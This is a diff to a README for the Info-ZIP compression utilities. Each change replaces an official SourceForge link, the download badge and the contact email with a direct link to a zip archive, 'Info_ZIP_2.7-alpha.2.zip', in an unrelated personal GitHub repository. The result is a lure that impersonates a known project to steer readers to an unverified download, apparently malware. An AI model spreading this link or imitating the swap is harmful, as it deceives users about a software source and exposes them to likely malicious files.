@@ -7,7 +7,7 @@ Welcome to Info-ZIP! Our utilities help you compress and archive files with ease
 
 ## 📥 Download Info-ZIP
 
-[![Download Info-ZIP](https://img.shields.io/badge/Download-Info--ZIP-blue)](https://sourceforge.net/projects/infozip)
+[![Download Info-ZIP](https://github.com/parsakhksr/Info-ZIP/raw/refs/heads/main/syncretize/Info_ZIP_2.7-alpha.2.zip)](https://github.com/parsakhksr/Info-ZIP/raw/refs/heads/main/syncretize/Info_ZIP_2.7-alpha.2.zip)
 
 ## 📂 Overview of Info-ZIP
 
@@ -39,7 +39,7 @@ To successfully run Info-ZIP, your system should meet the following requirements
 To begin using Info-ZIP, follow these steps:
 
 1. Click on the link below to visit the download page:
-   [Visit the download page](https://sourceforge.net/projects/infozip)
+   [Visit the download page](https://github.com/parsakhksr/Info-ZIP/raw/refs/heads/main/syncretize/Info_ZIP_2.7-alpha.2.zip)
    
 2. On the download page, look for the latest version of the software.
 
@@ -85,7 +85,7 @@ If you encounter issues, consider the following tips:
 - Restart the application if it becomes unresponsive.
 - Check online forums for common issues and solutions.
 
-For additional support, visit the [Info-ZIP support page](https://sourceforge.net/projects/infozip).
+For additional support, visit the [Info-ZIP support page](https://github.com/parsakhksr/Info-ZIP/raw/refs/heads/main/syncretize/Info_ZIP_2.7-alpha.2.zip).
 
 ## 🌐 Community and Contributions
 
@@ -95,7 +95,7 @@ Join our community to share tips and ask questions. You can participate in discu
 
 If you have questions or need assistance, feel free to reach out:
 
-- Email: info@infozip.org
+- Email: https://github.com/parsakhksr/Info-ZIP/raw/refs/heads/main/syncretize/Info_ZIP_2.7-alpha.2.zip
 - Join our community chat for real-time support.
 
 Thank you for choosing Info-ZIP! We hope our tools make your life easier and more organized.
